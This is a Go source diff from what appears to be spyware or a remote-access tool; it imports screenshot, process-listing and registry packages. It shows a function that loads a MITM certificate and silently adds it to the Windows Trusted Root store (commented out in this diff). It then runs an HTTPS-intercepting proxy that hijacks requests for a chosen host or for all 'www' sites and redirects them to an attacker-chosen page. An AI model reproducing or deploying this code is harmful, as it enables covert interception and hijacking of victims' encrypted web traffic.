@@ -7,14 +7,12 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
-	"encoding/pem"
 	"fmt"
 	"github.com/AdguardTeam/gomitmproxy"
 	"github.com/AdguardTeam/gomitmproxy/mitm"
 	"github.com/AdguardTeam/gomitmproxy/proxyutil"
 	"github.com/mitchellh/go-ps"
 	"github.com/vova616/screenshot"
-	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
 	"io"
@@ -218,7 +216,7 @@ var x = 1
 
 func redirect(source string, dest string) {
 	// Read the MITM cert and key.
-	tlsCert, err := tls.LoadX509KeyPair("C:\\Users\\IMOE001\\Desktop\\demo.crt", "C:\\Users\\IMOE001\\Desktop\\demo.key")
+	tlsCert, err := tls.LoadX509KeyPair("demo.crt", "demo.key")
 	privateKey := tlsCert.PrivateKey.(*rsa.PrivateKey)
 
 	x509c, err := x509.ParseCertificate(tlsCert.Certificate[0])
@@ -226,46 +224,46 @@ func redirect(source string, dest string) {
 		log.Fatal(err)
 	}
 
-	if x == 1 {
-		certFile := "C:\\Users\\IMOE001\\Desktop\\demo.crt"
-		certData, err := ioutil.ReadFile(certFile)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		// Parse certificate
-		block, _ := pem.Decode(certData)
-		if block == nil {
-			log.Fatal("Failed to parse certificate")
-		}
-		cert, err := x509.ParseCertificate(block.Bytes)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
-		if err != nil {
-			log.Fatal(err)
-		}
-		certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
-		if certContext == nil {
-			log.Fatal("Failed to create certificate context")
-		}
-		defer func(ctx *windows.CertContext) {
-			err := windows.CertFreeCertificateContext(ctx)
-			if err != nil {
-
-			}
-		}(certContext)
-
-		err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_REPLACE_EXISTING, nil)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
-		x = 2
-	}
+	//if x == 1 {
+	//	certFile := "C:\\Users\\IMOE001\\Desktop\\demo.crt"
+	//	certData, err := ioutil.ReadFile(certFile)
+	//	if err != nil {
+	//		log.Fatal(err)
+	//	}
+	//
+	//	// Parse certificate
+	//	block, _ := pem.Decode(certData)
+	//	if block == nil {
+	//		log.Fatal("Failed to parse certificate")
+	//	}
+	//	cert, err := x509.ParseCertificate(block.Bytes)
+	//	if err != nil {
+	//		log.Fatal(err)
+	//	}
+	//
+	//	store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
+	//	if err != nil {
+	//		log.Fatal(err)
+	//	}
+	//	certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
+	//	if certContext == nil {
+	//		log.Fatal("Failed to create certificate context")
+	//	}
+	//	defer func(ctx *windows.CertContext) {
+	//		err := windows.CertFreeCertificateContext(ctx)
+	//		if err != nil {
+	//
+	//		}
+	//	}(certContext)
+	//
+	//	err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_REPLACE_EXISTING, nil)
+	//	if err != nil {
+	//		log.Fatal(err)
+	//	}
+	//
+	//	fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
+	//	x = 2
+	//}
 	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
 		certsCache: map[string]*tls.Certificate{}},
 	)
@@ -285,43 +283,29 @@ func redirect(source string, dest string) {
 			Port: 8080,
 		},
 		MITMConfig: mitmConfig,
-		OnRequest: func(session *gomitmproxy.Session) (request *http.Request, response *http.Response) {
+		OnRequest: func(session *gomitmproxy.Session) (*http.Request, *http.Response) {
 			req := session.Request()
-
-			log.Printf("onRequest: %s %s", req.Method, req.URL.String())
-			fmt.Println(req.URL.Host)
+			fmt.Println(req.URL.String())
 			if req.URL.Host == source {
 				session.SetProp("blocked", true)
-				redirectURL := dest
-				resp, err := http.Get(redirectURL)
-				if err != nil {
-					log.Fatal(err)
-				}
-				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
-				res.Header.Set("Content-Type", "text/html")
-				res.Header.Set("Location", redirectURL)
-				return nil, res
-			} else if source == "all" {
-				req.Close = true
+			} else if source == "all" && req.URL.Host != dest && strings.Contains(req.URL.Host, "www") {
 				session.SetProp("blocked", true)
-				redirectURL := dest
-				resp, err := http.Get(redirectURL)
-				if err != nil {
-					log.Fatal(err)
-				}
-				res := proxyutil.NewResponse(http.StatusFound, resp.Body, nil)
-				res.Header.Set("Content-Type", "text/html")
-				res.Header.Set("Location", redirectURL)
-				time.Sleep(1 * time.Second)
-				return nil, res
 			}
 			return nil, nil
 		},
 		OnResponse: func(session *gomitmproxy.Session) *http.Response {
-			log.Printf("onResponse: %s", session.Request().URL.String())
-
+			req := session.Request()
 			if blocked, ok := session.GetProp("blocked"); ok && blocked.(bool) {
-				log.Printf("onResponse: was blocked")
+				fmt.Println(req.URL.Host)
+				resp, err := http.Get(dest)
+				if err != nil {
+					log.Fatal(err)
+				}
+				res := proxyutil.NewResponse(http.StatusFound, resp.Body, req)
+				res.Header.Set("Content-Type", "text/html")
+				res.Header.Set("Location", dest)
+				req.Response = res
+				return res
 			}
 			return session.Response()
 		},
